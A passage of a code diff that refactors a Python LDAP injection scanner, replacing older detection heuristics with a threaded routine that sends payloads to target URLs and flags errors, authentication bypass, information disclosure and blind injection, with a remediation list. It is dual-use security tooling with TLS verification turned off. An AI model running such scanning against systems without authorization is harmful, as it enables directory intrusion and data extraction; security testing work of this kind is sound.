-                evidence=f'Time delay: {response_time - baseline_time:.2f}s (baseline: {baseline_time:.2f}s)',
-                response_time=response_time,
-                confirmed=False,
-                confidence_score=delay_confidence / 100,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['time_based'] += 1
-        
-        has_filters, detected_filters = self.filter_detector.detect_ldap_filter_presence(response_content)
-        if has_filters:
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.FILTER_COMMENT_BYPASS,
-                url=target_url,
-                parameter='filter_detection',
-                payload='filter_bypass',
-                severity='Medium',
-                evidence=f'LDAP filters: {", ".join(detected_filters[:5])}',
-                response_time=response_time,
-                filter_detected='; '.join(detected_filters),
-                confirmed=True,
-                confidence_score=0.75,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['filter_detection'] += 1
-        
-        attributes = self.attribute_enumerator.extract_attributes_from_response(response_content)
-        if attributes:
-            sensitive_attrs = self.attribute_enumerator.detect_sensitive_attributes(attributes)
-            
-            severity = 'Critical' if sensitive_attrs else 'Medium'
-            
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.ATTRIBUTE_EXTRACTION,
-                url=target_url,
-                parameter='attribute_extraction',
-                payload='*',
-                severity=severity,
-                evidence=f'{len(attributes)} attributes extracted (Sensitive: {len(sensitive_attrs)}): {", ".join(attributes[:10])}',
-                response_time=response_time,
-                data_extracted='; '.join(attributes),
-                attributes_found=attributes,
-                confirmed=True,
-                confidence_score=0.85,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['attribute_extraction'] += 1
-        
-        base_dns = self.dn_enumerator.extract_base_dns_from_response(response_content)
-        if base_dns:
-            ous = self.dn_enumerator.extract_organizational_units(response_content)
-            
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.DN_ENUMERATION,
-                url=target_url,
-                parameter='dn_extraction',
-                payload='*',
-                severity='High',
-                evidence=f'Base DNs extracted: {", ".join(base_dns[:5])} | OUs: {", ".join(ous[:3])}',
-                response_time=response_time,
-                data_extracted='; '.join(base_dns[:10]),
-                dns_found=base_dns,
-                confirmed=True,
-                confidence_score=0.9,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['base_dn_extraction'] += 1
-        
-        has_ldap_strings, ldap_strings = self.response_analyzer.detect_ldap_specific_strings(response_content)
-        if has_ldap_strings:
-            vuln = LDAPVulnerability(
-                vulnerability_type='LDAP Injection',
-                ldap_type=LDAPInjectionType.FILTER_EXTRACTION,
-                url=target_url,
-                parameter='ldap_detection',
-                payload='detection',
-                severity='Low',
-                evidence=f'LDAP-specific strings: {", ".join(ldap_strings[:5])}',
-                response_time=response_time,
-                confirmed=True,
-                confidence_score=0.7,
-                remediation=self._remediation_cache
-            )
-            vulnerabilities.append(vuln)
-            self.scan_statistics['ldap_strings'] += 1
+            for future in as_completed(futures):
+                vuln = future.result()
+                if vuln:
+                    vulns.append(vuln)
         
         with self.lock:
-            self.vulnerabilities.extend(vulnerabilities)
-            self.scan_statistics['total_scans'] += 1
+            self.vulnerabilities.extend(vulns)
         
-        return vulnerabilities
+        return vulns
     
-    def test_blind_ldap_injection(self, target_url: str, parameter: str, 
-                                 baseline_response: str, responses: List[str]) -> Tuple[bool, float]:
-        if not responses or len(responses) < 3:
-            return False, 0.0
+    def _test_payload(self, url: str, param: str, payload: LDAPPayload,
+                     baseline: str, baseline_status: int, session) -> Optional[LDAPVulnerability]:
         
-        matching_responses = sum(1 for r in responses if r != baseline_response)
+        if not session:
+            return None
         
-        if matching_responses > len(responses) * 0.3:
-            confidence = matching_responses / len(responses)
-            return True, confidence
+        try:
+            test_url = f"{url}?{param}={payload.payload}"
+            start = time.time()
+            resp = session.get(test_url, timeout=10, verify=False)
+            elapsed = time.time() - start
+            
+            content = resp.text
+            status = resp.status_code
+            
+            has_errors, errors = self.error_detector.detect_ldap_errors(content)
+            if has_errors:
+                return self._create_vulnerability(
+                    LDAPVulnerabilityType.ERROR_BASED_INJECTION,
+                    url, param, payload.payload, f'LDAP errors detected: {", ".join(errors)}',
+                    status, len(content), elapsed, 'Medium', 0.82, ldap_errors=errors
+                )
+            
+            if payload.injection_type == LDAPVulnerabilityType.AUTHENTICATION_BYPASS:
+                bypassed, conf, evidence = self.auth_detector.detect_auth_bypass(
+                    baseline, content, baseline_status, status
+                )
+                if bypassed:
+                    return self._create_vulnerability(
+                        LDAPVulnerabilityType.AUTHENTICATION_BYPASS,
+                        url, param, payload.payload, f'Auth bypass: {evidence}',
+                        status, len(content), elapsed, 'Critical', conf,
+                        authentication_bypassed=True
+                    )
+            
+            disclosed, types, findings = self.info_detector.detect_information_disclosure(content)
+            if disclosed:
+                return self._create_vulnerability(
+                    LDAPVulnerabilityType.INFORMATION_DISCLOSURE,
+                    url, param, payload.payload,
+                    f'Information disclosed: {", ".join(types)} | {str(findings)[:150]}',
+                    status, len(content), elapsed, 'High', 0.88,
+                    information_disclosed=True
+                )
+            
+            if payload.injection_type == LDAPVulnerabilityType.BLIND_LDAP_INJECTION:
+                is_blind, conf, evidence = self.blind_detector.detect_blind_injection(
+                    content, baseline, status, baseline_status, elapsed, 1.0
+                )
+                if is_blind:
+                    return self._create_vulnerability(
+                        LDAPVulnerabilityType.BLIND_LDAP_INJECTION,
+                        url, param, payload.payload, f'Blind injection: {evidence}',
+                        status, len(content), elapsed, 'High', conf
+                    )
+            
+        except Exception:
+            pass
         
-        response_lengths = [len(r) for r in responses]
-        avg_length = sum(response_lengths) / len(response_lengths)
-        variance = sum((l - avg_length) ** 2 for l in response_lengths) / len(response_lengths)
-        
-        if variance > 1000:
-            return True, 0.7
-        
-        return False, 0.0
+        return None
     
-    def enumerate_user_attributes(self, base_url: str) -> Dict[str, List[str]]:
-        discovered_attributes = {}
+    def _create_vulnerability(self, ldap_type: LDAPVulnerabilityType, url: str, param: str,
+                            payload: str, evidence: str, status: int, size: int, 
+                            resp_time: float, severity: str, confidence: float,
+                            **kwargs) -> LDAPVulnerability:
         
-        for attr in LDAPAttributeEnumerator.COMMON_ATTRIBUTES:
-            query = f'({attr}=*)'
-            discovered_attributes[attr] = []
-        
-        return discovered_attributes
+        return LDAPVulnerability(
+            vulnerability_type='LDAP Vulnerability',
+            ldap_type=ldap_type,
+            url=url,
+            parameter=param,
+            payload=payload,
+            severity=severity,
+            evidence=evidence,
+            response_status=status,
+            response_size=size,
+            response_time=resp_time,
+            confirmed=True,
+            confidence_score=confidence,
+            remediation=self._get_remediation(),
+            **kwargs
+        )
     
-    def get_vulnerabilities(self) -> List[LDAPVulnerability]:
+    def _get_remediation(self) -> str:
+        return (
+            "1. Use parameterized LDAP queries. "
+            "2. Validate and sanitize all inputs. "
+            "3. Implement proper input escaping. "
+            "4. Use allowlists for input validation. "
+            "5. Implement least privilege access. "
+            "6. Use secure LDAP libraries. "
+            "7. Disable detailed error messages. "
+            "8. Implement rate limiting. "
+            "9. Monitor LDAP query patterns. "
+            "10. Use LDAPS (LDAP over SSL/TLS)."
+        )
+    
+    def get_vulnerabilities(self):
         with self.lock:
             return self.vulnerabilities.copy()
-    
-    def get_statistics(self) -> Dict[str, int]:
-        with self.lock:
-            return dict(self.scan_statistics)
-    
-    def get_tested_payloads(self) -> Set[str]:
-        with self.lock:
-            return self.tested_payloads.copy()
     
     def clear(self):
         with self.lock:
             self.vulnerabilities.clear()
-            self.scan_statistics.clear()
-            self.tested_payloads.clear()
+            self.baseline_responses.clear()
